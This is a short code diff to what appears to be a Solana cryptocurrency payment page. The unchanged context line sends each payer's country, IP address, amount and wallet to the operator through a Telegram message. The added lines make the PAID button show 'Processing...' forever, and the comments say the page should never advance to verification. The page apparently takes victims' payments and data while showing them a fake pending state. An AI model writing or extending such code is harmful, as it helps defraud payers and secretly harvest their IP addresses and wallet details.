@@ -318,9 +318,14 @@
                 startPayment();
                 showStep(3);
             } else if (step === 3) {
+                // Show loading immediately when PAID is clicked
+                document.getElementById('paidBtn').innerHTML = '<div class="loading"></div> Processing...';
+                document.getElementById('paidBtn').disabled = true;
+                
                 sendTelegram(`💳 PAYMENT CLAIM\n👤 ${userCountry} (${userIP})\n💰 ${selectedAmt} SOL\n🏦 ${wallet}`);
-                showStep(4);
-                verify();
+                
+                // Keep loading indefinitely - never advance to verification step
+                // The button will just stay in loading state forever
             }
         }
 
